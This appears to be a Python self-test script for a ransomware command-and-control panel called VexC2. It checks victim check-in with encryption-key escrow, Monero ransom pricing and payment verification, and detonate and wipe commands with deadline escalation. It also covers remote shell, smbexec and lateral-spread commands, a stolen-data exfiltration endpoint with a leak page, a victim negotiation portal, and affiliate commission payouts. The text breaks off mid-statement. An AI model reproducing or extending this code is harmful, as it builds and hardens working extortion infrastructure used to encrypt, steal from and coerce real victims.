#!/usr/bin/env python3
"""VexC2 3.0 self-test: auth, CSRF, API, portal, payments, webhook, builder."""

import base64
import gc
import hashlib
import hmac
import importlib
import io
import json
import os
import re
import shutil
import sqlite3
import struct
import sys
import tempfile
import threading
import time
import urllib.parse
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE = tempfile.mkdtemp(prefix="vexc2_selftest_")
os.environ["VEX_DB"] = os.path.join(BASE, "vex_c2.db")
os.environ["VEX_UPLOADS"] = os.path.join(BASE, "uploads")
os.environ["VEX_PASS"] = "selftest-pass"
os.environ["VEX_ROOT_PASS"] = "selftest-root-pass"
os.environ["VEX_MASTER"] = "selftest-master-passphrase"
os.environ["VEX_MASTER_FILE"] = os.path.join(BASE, ".master")
_TEST_PRIV = os.path.join(BASE, "priv.pem")
from Crypto.PublicKey import RSA as _RSA  # noqa: E402
with open(_TEST_PRIV, "wb") as _pf:
    _pf.write(_RSA.generate(2048).export_key())
os.environ["VEX_PRIV"] = _TEST_PRIV
os.environ.setdefault("VEX_SECRET", "x" * 64)
os.environ["VEX_AUDIT_KEY"] = "a" * 64
os.environ["VEX_AUDIT_ANCHOR"] = os.path.join(BASE, ".audit_anchor")
os.environ["VEX_BUILD_CACHE"] = os.path.join(BASE, "build_cache")
os.environ["VEX_NO_HOUSEKEEPING"] = "1"
os.environ["VEX_PANIC_DRY"] = "1"
os.environ["VEX_PANIC_BUILDS"] = "0"
os.environ["VEX_TRUST_PROXY"] = "1"
STAGE_FILE = os.path.join(BASE, "stage.bin")
with open(STAGE_FILE, "wb") as _sf:
    _sf.write(b"VXPAY003" + b"\x00" * 64)
os.environ["VEX_STAGE_FILE"] = STAGE_FILE

sys.path.insert(0, r"D:\Vexpayload\VexC2")
import c2db  # noqa: E402
import vault  # noqa: E402
import crypto_util  # noqa: E402
import app as c2  # noqa: E402

CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def csrf(path="/admin"):
    r = CL.get(path)
    m = re.search(rb'name="csrf" value="([0-9a-f]+)"', r.data)
    return m.group(1).decode() if m else ""


def login(user, pw, code=""):
    CL.get("/admin/logout")
    t = csrf("/admin/login")
    return CL.post("/admin/login",
                   data={"csrf": t, "username": user, "password": pw, "code": code})


def post(path, data=None):
    d = {"csrf": csrf()}
    if data:
        d.update(data)
    return CL.post(path, data=d)


CL = c2.app.test_client()
ok("uploads dir created at startup", os.path.isdir(os.environ["VEX_UPLOADS"]))

def _secret(vid):
    v = c2db.get_victim(vid)
    return vault.reveal(v["secret"]) if v and v["secret"] else ""


_TS_BUMP = [0]


def _hdr(vid, path, raw=b""):
    sec = _secret(vid)
    if not sec:
        return {}
    # Keep rapid test requests unique: the panel now rejects exact replays.
    if _TS_BUMP[0] > 240:
        time.sleep(1.1)
        _TS_BUMP[0] = 0
    ts = str(int(time.time()) + _TS_BUMP[0])
    _TS_BUMP[0] += 1
    mac = hmac.new(base64.b64decode(sec), f"{ts}|{path}|".encode() + raw,
                   hashlib.sha256).hexdigest()
    return {"X-Vex-Ts": ts, "X-Vex-Sig": mac}


def signed_post(path, data):
    raw = urllib.parse.urlencode(data).encode()
    headers = _hdr(data.get("vid", ""), path, raw)
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    return CL.post(path, data=raw, headers=headers)


def signed_checkin(data):
    raw = urllib.parse.urlencode(data).encode()
    headers = _hdr(data.get("vid", ""), "/api/checkin", raw)
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    return CL.post("/api/checkin", data=raw, headers=headers)


def ping(vid):
    body = CL.get("/api/ping?vid=" + vid,
                  headers=_hdr(vid, "/api/ping")).data.decode("utf-8", "replace")
    return body.splitlines()[0] if body else ""

# ---- csrf ---------------------------------------------------------------
CL.get("/admin/login")
ok("csrf enforced", CL.post("/admin/login", data={"username": "admin",
   "password": "selftest-pass"}).status_code == 400)

# ---- auth ---------------------------------------------------------------
TOK = csrf("/admin/login")
ok("bad login rejected", CL.post("/admin/login",
    data={"csrf": TOK, "username": "admin", "password": "nope"}).status_code == 401)
ok("login accepted", login("admin", "selftest-pass").status_code == 302)
ok("dashboard loads", b"Operations overview" in CL.get("/admin").data)
ok("analytics loads", b"Daily activity" in CL.get("/admin/analytics").data)

# ---- payload api ---------------------------------------------------------
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

priv = RSA.import_key(open(os.environ["VEX_PRIV"], "rb").read())
aes = bytes(range(32))
wrapped = base64.b64encode(PKCS1_OAEP.new(priv.publickey(), hashAlgo=SHA256).encrypt(aes)).decode()
vid = "c2testvid001abcd"

r = CL.post("/api/checkin", data={"vid": "bad vid!", "key": wrapped})
ok("bad vid rejected", r.status_code == 400)

r = CL.post("/api/checkin", data={"vid": vid, "key": wrapped, "host": "BOX",
                                  "user": "leo", "os": "10.0.19045"},
            headers={"X-Forwarded-For": "203.0.113.5"})
ok("checkin", r.status_code == 200)
ok("checkin issues a secret once", b"secret=" in r.data)
v = c2db.get_victim(vid)
ok("auto-unwrap", vault.reveal(v["aes_key"]) == base64.b64encode(aes).decode())
ok("keys sealed at rest", v["aes_key"].startswith("enc:v1:")
   and v["wrapped_key"].startswith("enc:v1:"))
ok("price seeded", (v["price"] or 0) > 0)
ok("xmr seeded", bool(v["xmr_address"]))
ok("ip from XFF", v["ip"] == "203.0.113.5")
r2 = signed_checkin({"vid": vid, "key": wrapped, "host": "BOX",
                     "user": "leo", "os": "10.0.19045"})
ok("recheckin does not reissue secret", b"secret=" not in r2.data)
_r = CL.post("/api/checkin", data={"vid": vid, "key": wrapped, "host": "EVIL"})
ok("unsigned recheckin rejected", _r.status_code == 403)
ok("ping sleeps", ping(vid) == "sleep")

# unique address assignment from the pool
c2db.set_setting("xmr_addresses", "addr-A\naddr-B")
p1, p2 = "pooladdr00000001", "pooladdr00000002"
CL.post("/api/checkin", data={"vid": p1, "key": wrapped})
CL.post("/api/checkin", data={"vid": p2, "key": wrapped})
a1 = c2db.get_victim(p1)["xmr_address"]
a2 = c2db.get_victim(p2)["xmr_address"]
ok("pool addresses unique", a1 in ("addr-A", "addr-B")
   and a2 in ("addr-A", "addr-B") and a1 != a2)
c2db.set_setting("xmr_addresses", "")

# ---- dashboard / victim --------------------------------------------------
ok("victim page", b"BOX" in CL.get("/admin/victim/" + vid).data)
ok("stats render", b"revenue" in CL.get("/admin").data)

# a re-checkin with a different wrapped key must not replace the stored key:
# losing the first key would make earlier ciphertext unrecoverable.
first_key = vault.reveal(c2db.get_victim(vid)["aes_key"])
aes2 = bytes(range(32, 64))
wrapped2 = base64.b64encode(
    PKCS1_OAEP.new(priv.publickey(), hashAlgo=SHA256).encrypt(aes2)).decode()
signed_checkin({"vid": vid, "key": wrapped2, "host": "BOX",
                "user": "leo", "os": "10.0.19045"})
ok("recheckin keeps first key",
   vault.reveal(c2db.get_victim(vid)["aes_key"]) == first_key)

# ---- management ----------------------------------------------------------
post("/admin/update", {"vid": vid, "update_type": "tags", "tags": "finance,vip"})
ok("tags update", (c2db.get_victim(vid)["tags"] or "") == "finance,vip")
post("/admin/update", {"vid": vid, "update_type": "price", "price": "777"})
ok("price update", abs((c2db.get_victim(vid)["price"] or 0) - 777) < 0.01)
post("/admin/update", {"vid": vid, "update_type": "notes", "notes": "test note"})
ok("notes update", c2db.get_victim(vid)["notes"] == "test note")
keyb64 = base64.b64encode(bytes(range(32))).decode()
post("/admin/update", {"vid": vid, "update_type": "aes_key", "aes_key": keyb64})
ok("manual key sealed at rest",
   c2db.get_victim(vid)["aes_key"].startswith("enc:v1:"))
ok("manual key displayed plaintext",
   keyb64.encode() in CL.get("/admin/victim/" + vid).data)

# ---- detonate / kill / reset --------------------------------------------
post("/admin/detonate/" + vid)
ok("arm", ping(vid) == "detonate")
post("/admin/kill/" + vid)
ok("kill", ping(vid) == "kill")
post("/admin/detonate_reset/" + vid)
ok("reset", ping(vid) == "sleep")
ok("get detonate is 405", CL.get("/admin/detonate/" + vid).status_code == 405)

# ---- pardon (root only) -------------------------------------------------
ok("admin cannot pardon", post("/admin/pardon/" + vid).status_code == 403)
ok("login root for pardon", login("root", "selftest-root-pass").status_code == 302)
post("/admin/detonate/" + vid)
post("/admin/pardon/" + vid)
ok("pardon overrides arm", ping(vid) == "pardon")
ok("pardon flag set", (c2db.get_victim(vid)["pardon"] or 0) == 1)
# Before a pardon is queued, a signed decrypter request must be refused.
with c2db.db() as conn:
    conn.execute("UPDATE victims SET pardon=0 WHERE vid=?", (vid,))
    conn.commit()
r = CL.get("/api/pardon_exe?vid=" + vid, headers=_hdr(vid, "/api/pardon_exe"))
ok("pardon exe unpaid rejected", r.status_code == 403, r.status_code)
with c2db.db() as conn:
    conn.execute("UPDATE victims SET pardon=1 WHERE vid=?", (vid,))
    conn.commit()
r = CL.get("/api/pardon_exe?vid=" + vid,
           headers=_hdr(vid, "/api/pardon_exe"))
ok("pardon exe signed", r.status_code in (200, 503),
   f"status={r.status_code}")
ok("pardon exe unsigned rejected",
   CL.get("/api/pardon_exe?vid=" + vid).status_code == 403)
CL.post("/api/report", data={"vid": vid, "kind": "pardon_done", "detail": "ok=1"})
ok("unsigned report rejected",
   CL.post("/api/report", data={"vid": vid, "kind": "smb",
                                "detail": "forged"}).status_code == 403)
_inc = signed_post("/api/report", {"vid": vid, "kind": "pardon_done", "detail": "ok=1"})
ok("pardon without journal evidence refused",
   _inc.status_code == 409 and c2db.get_victim(vid)["status"] == "pardon_incomplete")
signed_post("/api/report", {"vid": vid, "kind": "pardon_done",
                            "detail": "ok=1 journal=removed"})
_v = c2db.get_victim(vid)
ok("pardon done clears flag",
   (_v["pardon"] or 0) == 0 and _v["status"] == "pardoned")
ok("login admin again", login("admin", "selftest-pass").status_code == 302)

# Unknown VID must not fail open on command-bearing API endpoints.
ok("unknown report rejected",
   CL.post("/api/report", data={"vid": "unknownvid000001",
                                "kind": "smb", "detail": "x"}).status_code == 403)
ok("unknown exfil rejected",
   CL.post("/api/exfil", data={"vid": "unknownvid000001", "name": "x",
                               "idx": "0", "total": "1",
                               "data": "eA=="}).status_code == 403)

# ---- chat ----------------------------------------------------------------
post("/admin/chat", {"vid": vid, "message": "pay up"})
c2db.push_chat(vid, "VICTIM", "how much?")
ok("unread increments", (c2db.get_victim(vid)["chat_unread"] or 0) == 1)
CL.get("/admin/victim/" + vid)
ok("unread clears", (c2db.get_victim(vid)["chat_unread"] or 0) == 0)

# ---- reports / events ----------------------------------------------------
signed_post("/api/report", {"vid": vid, "kind": "smb", "detail": "spread 10.0.0.5",
                            "host": "BOX"})
ok("reports page", b"spread 10.0.0.5" in CL.get("/admin/reports").data)
ok("events page", b"checkin" in CL.get("/admin/events").data)

# ---- backup / prune ------------------------------------------------------
login("root", "selftest-root-pass")
post("/admin/root/stepup", {"password": "7542194114459229",
                            "next": "/admin/root"})
r = post("/admin/backup")
ok("backup download", r.status_code == 200 and r.data.startswith(b"SQLite format 3"))
_bp = os.path.join(BASE, "backup-check.db")
with open(_bp, "wb") as _bf:
    _bf.write(r.data)
try:
    import sqlite3 as _sql
    _bc = _sql.connect(_bp)
    _roots = _bc.execute("SELECT COUNT(*) FROM operators WHERE role IN ('root','shadow')").fetchone()[0]
    _totp = _bc.execute("SELECT COUNT(*) FROM operators WHERE totp_secret!=''").fetchone()[0]
    _bc.close()
    ok("backup redacts root/shadow and TOTP", _roots == 0 and _totp == 0)
finally:
    try: os.unlink(_bp)
    except OSError: pass
login("admin", "selftest-pass")
r = post("/admin/maintenance/prune", {"days": "90"})
ok("prune route", r.status_code == 302)

# ---- settings ------------------------------------------------------------
post("/admin/settings", {"portal_title": "LOCKED", "price_usd": "9000",
                         "xmr_address": "XMRADDR", "portal_intro": "hi",
                         "proof_max_mb": "8", "proof_enabled": "1",
                         "payment_mode": "manual", "wallet_rpc_url": "",
                         "wallet_rpc_user": "", "wallet_rpc_pass": "",
                         "xmr_usd_rate": "0", "backup_keep": "7",
                         "event_retention_days": "90"})
ok("settings saved", c2db.get_setting("price_usd") == "9000")
ok("settings page", b"wallet rpc" in CL.get("/admin/settings").data)

# ---- commands / routing / ledger ----------------------------------------
post("/admin/command/" + vid, {"ctype": "shell", "arg": "whoami"})
body = CL.get("/api/ping?vid=" + vid,
                 headers=_hdr(vid, "/api/ping")).data.decode()
ok("command dispatched", "cmd=" in body and "|shell|" in body)
cmdline = [l for l in body.splitlines() if l.startswith("cmd=")][0]
cid = cmdline.split("=", 1)[1].split("|")[0]
out = base64.b64encode(b"box-leo").decode()
signed_post("/api/report", {"vid": vid, "kind": "cmdout",
                            "detail": cid + "|ok|" + out})
with c2db.db() as conn:
    st = conn.execute("SELECT status, output FROM commands WHERE id=?", (cid,)).fetchone()
ok("command output stored", st and st["status"] == "done" and st["output"] == "box-leo")

with c2db.db() as conn:
    # The shared fixture was pardoned above; payments belong to live victims.
    conn.execute("UPDATE victims SET status='encrypted', pardon=0 WHERE vid=?",
                 (vid,))
    conn.commit()
r = post("/admin/payments", {"vid": vid, "amount": "100", "note": "deposit"})
ok("payment recorded", r.status_code == 302 and c2db.payments_total(vid) >= 100)

post("/admin/settings", {"c2_host": "c2.example.com", "deadline_hours": "48",
                         "escalate_1_hours": "24", "escalate_1_pct": "50",
                         "escalate_2_hours": "48", "escalate_2_pct": "100"})
ok("host pushed on ping", "host=c2.example.com" in CL.get("/api/ping?vid=" + vid, headers=_hdr(vid, "/api/ping")).data.decode())

# ---- deadline automation -----------------------------------------------
c2db.set_setting("auto_action", "wipe")
with c2db.db() as conn:
    conn.execute("UPDATE victims SET pardon=1, status='pardoned', "
                 "deadline='2000-01-01 00:00:00', deadline_fired=0 WHERE vid=?",
                 (vid,))
    conn.commit()
ok("deadline skips pardoned", c2db.deadline_tick() == 0)
with c2db.db() as conn:
    conn.execute("UPDATE victims SET pardon=0, status='encrypted', "
                 "deadline='2000-01-01 00:00:00', deadline_fired=0 WHERE vid=?",
                 (vid,))
    conn.commit()
ok("deadline fires once", c2db.deadline_tick() == 1 and c2db.deadline_tick() == 0)
with c2db.db() as conn:
    row = conn.execute("SELECT ctype, status FROM commands WHERE vid=? ORDER BY id DESC",
                       (vid,)).fetchone()
ok("deadline command queued", row and row["ctype"] == "wipe" and row["status"] == "pending")
c2db.set_setting("auto_action", "none")

# ---- exfil + leak + token ----------------------------------------------
blob = base64.b64encode(b"exfil-payload-bytes").decode()
raw = urllib.parse.urlencode({"vid": vid, "name": "leak.txt", "idx": "0",
                              "total": "1", "data": blob}).encode()
r = CL.post("/api/exfil", data=raw,
            content_type="application/x-www-form-urlencoded",
            headers=_hdr(vid, "/api/exfil", raw))
ok("exfil endpoint", r.status_code == 200 and len(c2db.list_uploads(vid)) >= 1, f"{r.status_code} {r.data[:120]!r}")
ok("leak page lists file", b"leak.txt" in CL.get("/leak/" + vid).data)

# two concurrent transfer ids for the same victim/name must not collide
def _exfil_chunk(xfer, blob):
    body = urllib.parse.urlencode({"vid": vid, "name": "same.txt", "idx": "0",
                                   "total": "1", "xfer": xfer,
                                   "data": base64.b64encode(blob).decode()}).encode()
    return CL.post("/api/exfil", data=body,
                   content_type="application/x-www-form-urlencoded",
                   headers=_hdr(vid, "/api/exfil", body))

r1 = _exfil_chunk("xferAAA111", b"first-transfer")
r2 = _exfil_chunk("xferBBB222", b"second-transfer")
ok("two transfers accepted", r1.status_code == 200 and r2.status_code == 200)
with c2db.db() as conn:
    paths = [r["path"] for r in conn.execute(
        "SELECT path FROM uploads WHERE vid=? ORDER BY id DESC LIMIT 2", (vid,))]
bytes_seen = set()
for p in paths:
    with open(p, "rb") as fh:
        bytes_seen.add(fh.read())
ok("transfer ids keep both files",
   bytes_seen == {b"first-transfer", b"second-transfer"})

c2db.set_setting("api_token", "tok-test")
ok("token required", CL.get("/api/ping?vid=" + vid).status_code == 403)
tok_h = _hdr(vid, "/api/ping")
tok_h["X-Vex-Token"] = "tok-test"
ok("token accepted", CL.get("/api/ping?vid=" + vid,
                            headers=tok_h).status_code == 200)
# Repeated polls are allowed; state-changing signed requests are not.
_raw = urllib.parse.urlencode({"vid": vid, "kind": "smb",
                               "detail": "replay-test"}).encode()
_rh = _hdr(vid, "/api/report", _raw)
_rh["Content-Type"] = "application/x-www-form-urlencoded"
_rh["X-Vex-Token"] = "tok-test"
_r1 = CL.post("/api/report", data=_raw, headers=_rh)
_r2 = CL.post("/api/report", data=_raw, headers=_rh)
ok("signed replay rejected", _r1.status_code == 200 and _r2.status_code == 403)
stage_ok = CL.get("/api/stage", headers={"X-Vex-Token": "tok-test"})
ok("stage token accepted", stage_ok.status_code == 200
   and stage_ok.data.startswith(b"VXPAY003"))
ok("stage wrong token rejected",
   CL.get("/api/stage", headers={"X-Vex-Token": "nope"}).status_code == 403)
bad_h = {"X-Vex-Ts": str(int(time.time())), "X-Vex-Sig": "00" * 32}
ok("bad signature rejected",
   CL.get("/api/ping?vid=" + vid, headers=bad_h).status_code == 403)
c2db.set_setting("api_token", "")
ok("stage disabled when no token",
   CL.get("/api/stage", headers={"X-Vex-Token": "tok-test"}).status_code == 403)

# ---- queue v2 / templates ----------------------------------------------
qvid = "queuevid00000001"
CL.post("/api/checkin", data={"vid": qvid, "key": wrapped})
c2db.queue_command(qvid, "shell", "low", 0)
c2db.queue_command(qvid, "recon", "", 5)
body = CL.get("/api/ping?vid=" + qvid, headers=_hdr(qvid, "/api/ping")).data.decode()
line = [l for l in body.splitlines() if l.startswith("cmd=")][0]
ok("priority dispatch", line.split("|")[1] == "recon", line)
with c2db.db() as conn:
    low = conn.execute("SELECT id FROM commands WHERE vid=? AND ctype='shell' "
                       "AND status='pending'", (qvid,)).fetchone()
ok("cancel works", c2db.cancel_command(low["id"])
   and not c2db.cancel_command(low["id"]))

cid = c2db.queue_command(qvid, "shell", "retry")
first = c2db.claim_command(qvid)
with c2db.db() as conn:
    conn.execute("UPDATE commands SET dispatched_at='2000-01-01 00:00:00', attempts=1 "
                 "WHERE id=?", (cid,))
    conn.commit()
c2db.expire_commands()
row = dbrow_cmd = None
with c2db.db() as conn:
    row = conn.execute("SELECT status, attempts FROM commands WHERE id=?", (cid,)).fetchone()
ok("timeout requeues", row and row["status"] == "pending" and row["attempts"] == 1)

c2db.claim_command(qvid)
with c2db.db() as conn:
    conn.execute("UPDATE commands SET dispatched_at='2000-01-01 00:00:00', attempts=3 "
                 "WHERE id=?", (cid,))
    conn.commit()
c2db.expire_commands()
with c2db.db() as conn:
    row = conn.execute("SELECT status, error FROM commands WHERE id=?", (cid,)).fetchone()
ok("timeout fails after max", row and row["status"] == "failed" and row["error"] == "timeout")
ok("templates page", b"Negotiation templates" in CL.get("/admin/templates").data)
post("/admin/command/" + qvid, {"ctype": "admins", "arg": ""})
with c2db.db() as conn:
    row = conn.execute("SELECT ctype FROM commands WHERE vid=? ORDER BY id DESC LIMIT 1",
                       (qvid,)).fetchone()
ok("lateral command queued", row and row["ctype"] == "admins")
post("/admin/command/" + qvid, {"ctype": "spread", "arg": "off"})
with c2db.db() as conn:
    row = conn.execute("SELECT ctype FROM commands WHERE vid=? ORDER BY id DESC LIMIT 1",
                       (qvid,)).fetchone()
ok("spread command queued", row and row["ctype"] == "spread")
post("/admin/command/" + qvid, {"ctype": "smbexec", "arg": "127.0.0.1|whoami"})
with c2db.db() as conn:
    row = conn.execute("SELECT ctype, arg FROM commands WHERE vid=? ORDER BY id DESC LIMIT 1",
                       (qvid,)).fetchone()
ok("smbexec command queued", row and row["ctype"] == "smbexec"
   and row["arg"] == "127.0.0.1|whoami")
post("/admin/command/" + qvid, {"ctype": "usb", "arg": "status"})
with c2db.db() as conn:
    row = conn.execute("SELECT ctype, arg FROM commands WHERE vid=? ORDER BY id DESC LIMIT 1",
                       (qvid,)).fetchone()
ok("usb command queued", row and row["ctype"] == "usb" and row["arg"] == "status")
post("/admin/affiliates", {"action": "commission", "operator": "admin", "amount": "10"})
post("/admin/payments", {"vid": vid, "amount": "1000", "note": "aff"})
rows = {a["username"]: a for a in c2db.affiliates()}
with c2db.db() as conn:
    aff_total = conn.execute(
        "SELECT COALESCE(SUM(amount),0) FROM payments WHERE affiliate='admin'"
    ).fetchone()[0]
expected = round(float(aff_total) * 0.10, 2)
ok("affiliate commission", abs(rows["admin"]["commission"] - expected) < 0.01,
   f"{rows['admin']['commission']} vs {expected}")
post("/admin/affiliates", {"action": "payout", "operator": "admin",
                           "amount": "25", "note": "test"})
rows = {a["username"]: a for a in c2db.affiliates()}
ok("affiliate payout", abs(rows["admin"]["paid"] - 25) < 0.01
   and abs(rows["admin"]["balance"] - (expected - 25)) < 0.01)
ok("affiliates page", b"Affiliates" in CL.get("/admin/affiliates").data)

# ---- webhook stub --------------------------------------------------------
HOOK = []


class HookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        HOOK.append(self.rfile.read(n))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


hook_srv = ThreadingHTTPServer(("127.0.0.1", 0), HookHandler)
threading.Thread(target=hook_srv.serve_forever, daemon=True).start()
os.environ["VEX_WEBHOOK"] = f"http://127.0.0.1:{hook_srv.server_port}/hook"

CL.post("/api/checkin", data={"vid": "hookvid000000001", "key": wrapped, "host": "HOOKBOX",
                              "user": "u", "os": "10"})
time.sleep(1.2)
ok("webhook fired", bool(HOOK) and b"new victim" in b"".join(HOOK))

# ---- portal --------------------------------------------------------------
CL.get("/portal/logout")
t = csrf("/portal")
r = CL.post("/portal", data={"csrf": t, "vid": vid})
ok("portal login", r.status_code == 302)
ok("portal view", b"LOCKED" in CL.get("/portal/view").data)


def v2_container(plain: bytes, key: bytes) -> bytes:
    from Crypto.Cipher import AES
    chunks = [plain[i:i + 65536] for i in range(0, len(plain), 65536)]
    out = bytearray(struct.pack("<4sIQIIQ", b"VEX2", 0, len(plain), 1, 65536, len(chunks)))
    for ch in chunks:
        nonce = os.urandom(12)
        cc = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ct, tag = cc.encrypt_and_digest(ch)
        out += bytes([1]) + struct.pack("<I", len(ch)) + nonce + ct + tag
    return bytes(out)


plain = b"PROOF SAMPLE 123" * 100
t = csrf("/portal/view")
r = CL.post("/portal/proof", data={"csrf": t,
                                   "sample": (io.BytesIO(v2_container(plain, aes)),
                                              "doc.txt.l0cked")},
            content_type="multipart/form-data")
ok("proof decrypts", r.status_code == 200 and r.data == plain, r.status_code)
t = csrf("/portal/view")
r = CL.post("/portal/proof", data={"csrf": t,
                                   "sample": (io.BytesIO(v2_container(plain, aes)),
                                              "doc2.txt.l0cked")},
            content_type="multipart/form-data")
ok("proof cannot be reused", r.status_code == 302 and r.data != plain)

# ---- auto reply ---------------------------------------------------------
c2db.set_setting("auto_reply", "1")
chat_before = json.loads(c2db.get_victim(vid)["chat"])
t = csrf("/portal/view")
CL.post("/portal/view", data={"csrf": t, "message": "hello, how do I pay?"})
chat_after = json.loads(c2db.get_victim(vid)["chat"])
admins = [m for m in chat_after if m["sender"] == "ADMIN"]
ok("auto reply sent", len(admins) > len([m for m in chat_before if m["sender"] == "ADMIN"]))
CL.post("/portal/view", data={"csrf": t, "message": "again"})
chat3 = json.loads(c2db.get_victim(vid)["chat"])
ok("auto reply cooldown", len([m for m in chat3 if m["sender"] == "ADMIN"]) == len(admins))
c2db.set_setting("auto_reply", "0")

# ---- decryptor downloads -------------------------------------------------
login("admin", "selftest-pass")
r = CL.get("/admin/decryptor/" + vid)
ok("decryptor cpp", r.status_code == 200 and
   base64.b64encode(aes) in r.data and b"{{AES_KEY_B64}}" not in r.data)
r = CL.get("/admin/decrypter_exe/" + vid)
ok("decryptor exe built", r.status_code == 200 and r.data[:2] == b"MZ",
   f"{r.status_code} {len(r.data)}B")
r = CL.get(f"/admin/decrypter_exe/{vid}?arch=x86")
pe = r.data[:2] == b"MZ"
machine = 0
if pe:
    off = struct.unpack_from("<I", r.data, 0x3C)[0]
    machine = struct.unpack_from("<H", r.data, off + 4)[0]
ok("decryptor x86 built", r.status_code == 200 and pe and machine == 0x14C,
   f"{r.status_code} {hex(machine)}")

ok("csv export", b"BOX" in CL.get("/admin/export/victims.csv").data)
j = CL.get("/admin/api/overview").get_json()
ok("overview json", j["stats"]["total"] >= 1 and "victims" in j)

# ---- payments stub -------------------------------------------------------
RPC_TRANSFER = {}


class RpcHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        req = json.loads(self.rfile.read(n) or b"{}")
        result = {"in": [], "pending": []}
        if req.get("method") == "get_transfers":
            result = {"in": [RPC_TRANSFER], "pending": []}
        body = json.dumps({"jsonrpc": "2.0", "id": "0", "result": result}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


rpc_srv = ThreadingHTTPServer(("127.0.0.1", 0), RpcHandler)
threading.Thread(target=rpc_srv.serve_forever, daemon=True).start()

price = c2db.get_victim(vid)["price"] or 777
rate = 200.0
need = price / rate
RPC_TRANSFER.update({"address": c2db.get_victim(vid)["xmr_address"],
                     "amount": int(need * 1e12) + 10 ** 9,
                     "txid": "selftest-tx-0001"})
c2db.set_setting("payment_mode", "rpc")
c2db.set_setting("wallet_rpc_url", f"http://127.0.0.1:{rpc_srv.server_port}/json_rpc")
c2db.set_setting("xmr_usd_rate", str(rate))
with c2db.db() as conn:
    conn.execute("UPDATE victims SET status='negotiating' WHERE vid=?", (vid,))
    conn.commit()
r = post("/admin/payments/check")
ok("payment routed", r.status_code == 302)
ok("payment marked paid", c2db.get_victim(vid)["status"] == "paid")
with c2db.db() as conn:
    conn.execute("UPDATE victims SET detonate=1 WHERE vid=?", (vid,))
    conn.commit()
ok("paid victim ignores stale detonate", ping(vid) == "sleep")
with c2db.db() as conn:
    conn.execute("UPDATE victims SET detonate=0 WHERE vid=?", (vid,))
    conn.commit()

# the same txid must not pay a second victim sharing the address
vid2 = "paydup0000000001"
with c2db.db() as conn:
    conn.execute("INSERT INTO victims (vid, aes_key, hostname, status, timestamp, "
                 "price, xmr_address) VALUES (?,?,?,?,?,?,?)",
                 (vid2, "", "DUPTEST", "encrypted", c2db.now(), price,
                  c2db.get_victim(vid)["xmr_address"]))
    conn.commit()
post("/admin/payments/check")
ok("txid cannot pay twice", c2db.get_victim(vid2)["status"] != "paid")
with c2db.db() as conn:
    n = conn.execute("SELECT COUNT(*) FROM payments WHERE txid=?",
                     ("selftest-tx-0001",)).fetchone()[0]
ok("one ledger row per txid", n == 1)
r = post("/admin/payments", {"vid": vid, "amount": "1",
                             "txid": "selftest-tx-0001"})
ok("duplicate manual txid is rejected cleanly", r.status_code == 302)

# ---- roles ---------------------------------------------------------------
post("/admin/operators", {"username": "viewer1", "password": "viewerpass1",
                          "role": "viewer"})
ok("viewer login", login("viewer1", "viewerpass1").status_code == 302)
ok("viewer page hides admin controls",
   b"<h2>Management</h2>" not in CL.get("/admin/victim/" + vid).data
   and b"aes-256 (b64)" not in CL.get("/admin/victim/" + vid).data)
t = csrf("/admin")
ok("viewer blocked from detonate",
   CL.post("/admin/detonate/" + vid, data={"csrf": t}).status_code == 403)
ok("viewer blocked from chat",
   CL.post("/admin/chat", data={"csrf": t, "vid": vid,
                                "message": "nope"}).status_code == 403)

login("admin", "selftest-pass")
post("/admin/operators", {"username": "neg1", "password": "negpass123",
                          "role": "negotiator"})
login("neg1", "negpass123")
t = csrf("/admin")
ok("negotiator can chat",
   CL.post("/admin/chat", data={"csrf": t, "vid": vid,
                                "message": "hello"}).status_code == 302)
ok("negotiator blocked from operate",
   CL.post("/admin/detonate/" + vid, data={"csrf": t}).status_code == 403)
login("admin", "selftest-pass")

# ---- TOTP + backup codes -------------------------------------------------
codes, hashed = c2db.make_backup_codes()
secret = c2db.new_totp_secret()
with c2db.db() as conn:
    conn.execute("INSERT INTO operators (username, pw_hash, role, totp_secret,"
                 " backup_codes, created) VALUES (?,?,?,?,?,?)",
                 ("totpuser", c2db.hash_password("totppass1"), "viewer",
                  secret, hashed, c2db.now()))
    conn.commit()
ok("totp required", login("totpuser", "totppass1").status_code == 401)
ok("totp accepted", login("totpuser", "totppass1",
                          c2db.totp_code(secret)).status_code == 302)
ok("backup code works", login("totpuser", "totppass1", codes[0]).status_code == 302)
ok("backup code single-use", login("totpuser", "totppass1", codes[0]).status_code == 401)

# ---- root TOTP ----------------------------------------------------------
login("root", "selftest-root-pass")
t = csrf("/admin/root/2fa")
CL.post("/admin/root/2fa", data={"csrf": t, "action": "enroll",
                                 "password": "selftest-root-pass"})
with c2db.db() as conn:
    root_secret = conn.execute("SELECT totp_secret FROM operators "
                               "WHERE role='root'").fetchone()["totp_secret"]
ok("root 2fa enrolled", bool(root_secret))
ok("root login needs code", login("root", "selftest-root-pass").status_code == 401)
ok("root login with code", login("root", "selftest-root-pass",
                                 c2db.totp_code(root_secret)).status_code == 302)
t = csrf("/admin/root/2fa")
CL.post("/admin/root/2fa", data={"csrf": t, "action": "disable",
                                 "code": c2db.totp_code(root_secret)})
ok("root 2fa disabled", login("root", "selftest-root-pass").status_code == 302)
# Step-up replay state must never put the new master/pins in the cookie.
with CL.session_transaction() as _s:
    _s.pop("root_stepup_at", None)
t = csrf("/admin/root")
CL.post("/admin/root/rotate-master",
        data={"csrf": t, "new_master": "CookieSecretXYZ",
              "confirm": "CookieSecretXYZ"})
_cookie = CL.get_cookie("session")
ok("step-up secrets stay server-side",
   not _cookie or "CookieSecretXYZ" not in _cookie.value)
c2._ROOT_PENDING.clear()
with CL.session_transaction() as _s:
